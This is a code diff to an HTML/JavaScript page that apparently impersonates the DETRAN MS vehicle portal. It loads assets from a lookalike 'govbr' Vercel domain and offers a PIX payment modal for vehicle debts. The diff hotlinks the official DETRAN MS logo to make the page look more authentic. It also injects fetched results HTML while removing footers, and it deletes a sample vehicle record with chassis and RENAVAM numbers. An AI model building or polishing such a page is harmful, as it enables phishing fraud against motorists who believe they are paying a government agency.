@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal Meu Detran MS</title>
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" href="favicon.png">
     <!-- Usando o CSS original do site -->
     <link rel="stylesheet" href="https://detranmatogrossosul-govbr.vercel.app/_next/static/chunks/996de2e32a16761a.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -442,119 +440,6 @@
                 padding: 12px;
             }
         }
-
-        /* ========================================= */
-        /* ESTILOS PARA PÁGINA DE RESULTADOS (IGUAL À IMAGEM) */
-        /* ========================================= */
-        .resultados-wrapper {
-            width: 100%;
-            max-width: 1050px;
-            margin: 0 auto;
-            padding: 20px;
-            font-family: Arial, sans-serif;
-            background: white;
-        }
-
-        .header-resultados {
-            text-align: center;
-            margin-bottom: 30px;
-            padding-bottom: 15px;
-            border-bottom: 2px solid #2c5799;
-        }
-
-        .logo-resultados {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        .logo-resultados img {
-            height: 60px;
-        }
-
-        .titulo-principal {
-            color: #2c5799;
-            font-size: 32px;
-            font-weight: bold;
-            margin: 10px 0 5px 0;
-            text-transform: uppercase;
-        }
-
-        .subtitulo-principal {
-            color: #333;
-            font-size: 18px;
-            margin: 5px 0;
-            font-weight: bold;
-        }
-
-        .subtitulo-secundario {
-            color: #666;
-            font-size: 16px;
-            margin: 5px 0;
-        }
-
-        .tabela-dados {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 20px 0;
-            font-size: 14px;
-        }
-
-        .tabela-dados th {
-            background: #e9ecef;
-            padding: 12px;
-            border: 1px solid #ddd;
-            font-weight: bold;
-            text-align: center;
-            color: #2c5799;
-        }
-
-        .tabela-dados td {
-            padding: 12px;
-            border: 1px solid #ddd;
-            text-align: center;
-        }
-
-        .linha-cinza {
-            background: #f8f9fa;
-        }
-
-        .status-vencido {
-            color: #dc3545;
-            font-weight: bold;
-        }
-
-        .status-disponivel {
-            color: #28a745;
-            font-weight: bold;
-        }
-
-        .observacoes-box {
-            background: #fff8e1;
-            padding: 20px;
-            border-radius: 10px;
-            border-left: 4px solid #ff9800;
-            margin: 30px 0;
-        }
-
-        .observacoes-titulo {
-            color: #e65100;
-            margin-bottom: 15px;
-            font-weight: bold;
-            font-size: 16px;
-        }
-
-        .observacoes-lista {
-            color: #333;
-            margin-left: 20px;
-            line-height: 1.6;
-        }
-
-        .observacoes-lista li {
-            margin-bottom: 8px;
-        }
     </style>
 </head>
 <body class="font-sans">
@@ -707,8 +592,9 @@
                     <i class="fas fa-times"></i>
                 </button>
                 <h2>
-                    <!-- LOGO DETRAN MS REAL (substitua pelo arquivo que você baixar) -->
-                    <img src="logo_detran.png" alt="DETRAN MS" style="height: 30px; margin-right: 10px;">
+                    <!-- LOGO DETRAN MS REAL -->
+                    <img src="https://www.detran.ms.gov.br/wp-content/uploads/2020/04/LOGO-DETRAN-MS.png" 
+                         alt="DETRAN MS" style="height: 30px; margin-right: 10px;">
                     DETRAN MS - PAGAMENTO PIX
                 </h2>
                 <p style="opacity: 0.9; font-size: 14px;">Pagamento Seguro via PIX</p>
@@ -987,99 +873,24 @@
             function exibirResultados(html) {
                 formularioContainer.classList.add('hidden');
                 menuTitulo.textContent = 'Resultados da Consulta';
+                resultadosContainer.innerHTML = html;
                 
-                // Criação da página de resultados idêntica à imagem
-                resultadosContainer.innerHTML = `
-                    <div class="resultados-wrapper">
-                        <!-- CABEÇALHO -->
-                        <div class="header-resultados">
-                            <div class="logo-resultados">
-                                <!-- LOGO GOVERNO MS -->
-                                <img src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/logo.svg" alt="Governo MS" style="height: 60px;">
-                                <!-- LOGO DETRAN MS (substitua pelo arquivo que você baixar) -->
-                                <img src="logo_detran.png" alt="DETRAN MS" style="height: 50px;">
-                            </div>
-                            <h1 class="titulo-principal">MEUDETRAN</h1>
-                            <p class="subtitulo-principal">Departamento Estadual de Trânsito</p>
-                            <p class="subtitulo-secundario">Governo de Mato Grosso do Sul</p>
-                        </div>
-                        
-                        <!-- LINHA DIVISÓRIA -->
-                        <div style="height: 2px; background: #ccc; margin: 20px 0;"></div>
-                        
-                        <!-- TÍTULO CONSULTA -->
-                        <h2 style="text-align: center; color: #2c5799; margin: 30px 0; font-size: 24px;">
-                            CONSULTA DE DÉBITOS, MULTAS E LICENCIAMENTO
-                        </h2>
-                        
-                        <p style="text-align: center; margin-bottom: 30px; font-size: 16px;">
-                            Confira os dados do veículo informado na consulta de débitos.
-                        </p>
-                        
-                        <!-- DADOS DO VEÍCULO -->
-                        <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin-bottom: 30px;">
-                            <h3 style="color: #2c5799; margin-bottom: 20px; text-align: center; font-size: 18px;">
-                                DADOS DO VEÍCULO
-                            </h3>
-                            
-                            <!-- TABELA DE DADOS -->
-                            <table class="tabela-dados">
-                                <tr>
-                                    <th>PLACA</th>
-                                    <th>RENAVAM</th>
-                                    <th>FABRICAÇÃO/MODELO</th>
-                                    <th>MODELO</th>
-                                </tr>
-                                <tr class="linha-cinza">
-                                    <td>ABC1D23</td>
-                                    <td>00467880476</td>
-                                    <td>2012/2013</td>
-                                    <td>VW/VOYAGE 1.6 COMFORTL</td>
-                                </tr>
-                                <tr>
-                                    <th>CHASSI</th>
-                                    <th>MOTOR</th>
-                                    <th>COR</th>
-                                    <th>CATEGORIA</th>
-                                </tr>
-                                <tr class="linha-cinza">
-                                    <td>9BWDB45U0DT052088</td>
-                                    <td>CCRA34737</td>
-                                    <td>BRANCA</td>
-                                    <td>PARTIC</td>
-                                </tr>
-                                <tr>
-                                    <th>DOC. EXP.</th>
-                                    <th>LICENCIAMENTO</th>
-                                    <th>CIDADE</th>
-                                    <th>CRLV DIGITAL</th>
-                                </tr>
-                                <tr class="linha-cinza">
-                                    <td>06/08/2024</td>
-                                    <td class="status-vencido">VENCIDO</td>
-                                    <td>CORUMBÁ</td>
-                                    <td class="status-disponivel">DISPONÍVEL</td>
-                                </tr>
-                            </table>
-                        </div>
-                        
-                        <!-- OBSERVAÇÕES -->
-                        <div class="observacoes-box">
-                            <h4 class="observacoes-titulo">OBSERVAÇÕES</h4>
-                            <ul class="observacoes-lista">
-                                <li>VEÍCULO COM ALIENAÇÃO FIDUCIÁRIA BANCO VOTORANTIM S/A</li>
-                                <li>VEÍCULO SEM RESTRIÇÃO PGFN</li>
-                            </ul>
-                        </div>
-                        
-                        <!-- BOTÃO VOLTAR -->
-                        <div style="text-align: center; margin-top: 40px;">
-                            <button onclick="voltarParaConsulta()" class="btn-voltar">
-                                ← NOVA CONSULTA
-                            </button>
-                        </div>
-                    </div>
+                const botaoVoltar = document.createElement('div');
+                botaoVoltar.className = 'text-center mt-8 mb-6';
+                botaoVoltar.innerHTML = `
+                    <button onclick="voltarParaConsulta()" 
+                            class="btn-voltar">
+                        ← Nova Consulta
+                    </button>
                 `;
+                
+                const resultadosDiv = resultadosContainer.querySelector('div') || resultadosContainer;
+                resultadosDiv.appendChild(botaoVoltar);
+                
+                const rodapes = resultadosContainer.querySelectorAll('footer');
+                if (rodapes.length > 0) {
+                    rodapes.forEach(rodape => rodape.remove());
+                }
                 
                 resultadosContainer.classList.remove('hidden');
             }
